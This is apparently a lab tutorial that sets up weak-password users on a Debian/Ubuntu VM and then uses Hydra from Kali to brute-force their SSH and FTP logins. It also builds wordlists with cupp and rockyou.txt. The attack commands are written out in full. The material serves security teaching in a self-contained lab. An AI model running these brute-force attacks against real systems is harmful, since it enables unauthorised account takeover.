# HYDRA - Brute Force Tool --> Practical Overview

**Objective:**

- Set up **5 users** with simple passwords on a target Debian/Ubuntu VM.
- Connect attacker VM (Kali Linux) via **SSH**.
- Use **Hydra** to brute-force SSH logins.
- Use **`cupp`** to generate custom wordlists.
- Use **prebuilt wordlists** like `rockyou.txt`.

---

## ğŸ”¹ **Step 1: Target VM Setup (Debian/Ubuntu)**

**1ï¸âƒ£ Create 5 users with passwords**

```bash
sudo adduser user1
# Enter password: admin@123

sudo adduser user2
# Enter password: admin@1234

sudo adduser user3
# Enter password: admin@12345

sudo adduser user4
# Enter password: admin@123456

sudo adduser user5
# Enter password: admin@1234567
```

**2ï¸âƒ£ Confirm SSH is running**

```bash
sudo systemctl status ssh
# If not installed:
sudo apt update
sudo apt install openssh-server
sudo systemctl start ssh
sudo systemctl enable ssh
```

**3ï¸âƒ£ Find Target IP**

```bash
ip a
# Example: 192.168.100.10
```

---

## ğŸ”¹ **Step 2: Attacker VM Setup (Kali Linux)**

### âœ”ï¸ Create `users.txt` and `passwords.txt`

```bash
echo -e "user1\nuser2\nuser3\nuser4\nuser5" > users.txt
echo -e "admin@123\nadmin@1234\nadmin@12345\nadmin@123456\nadmin@1234567" > passwords.txt
```

**Check files:**

```bash
cat users.txt
cat passwords.txt
```

---

## ğŸ”¹ **Step 3: Run Hydra to Brute-Force SSH**

```bash
sudo -s   # Switch to root if needed
hydra -L users.txt -P passwords.txt ssh://192.168.100.10
```

âœ… **Expected Output:** Hydra will test all combinations and show valid username\:password pairs.

---

## ğŸ”¹ **Step 4: Download Real Wordlists (rockyou.txt)**

```bash
# rockyou.txt is often already in Kali
ls /usr/share/wordlists/

# If not, extract it:
gzip -d /usr/share/wordlists/rockyou.txt.gz

# OR download from GitHub:
cd ~
git clone https://github.com/brannondorsey/naive-hashcat
cd naive-hashcat
ls
```

---

## ğŸ”¹ **Step 5: Use `cupp` to Create Custom Wordlists**

```bash
sudo apt update
sudo apt install cupp

# Run cupp interactive:
cupp -i

# Example questions:
# Name: admin
# Birthdate: 123
# Pet name: admin
# -> Will generate a wordlist.txt with permutations.

# You can check:
ls
cat admin.txt
```

---

## ğŸ”¹ **Step 6: Restart FTP (Optional)**

If testing FTP instead of SSH:

```bash
sudo apt install vsftpd
sudo systemctl restart vsftpd
sudo ufw allow 21/tcp  # Allow FTP port
```

**Run Hydra for FTP:**

```bash
hydra -L users.txt -P passwords.txt ftp://192.168.100.10
```

---

## âœ… **Bonus Tips**

âœ”ï¸ **Useful Hydra syntax:**

```
hydra -L users.txt -P passwords.txt ssh://<IP>
hydra -l user1 -P rockyou.txt ssh://<IP>
```

âœ”ï¸ **Check open ports:**

```bash
nmap -sV 192.168.100.10
```

âœ”ï¸ **Location of default wordlists:**

```bash
cd /usr/share/wordlists/
ls
```

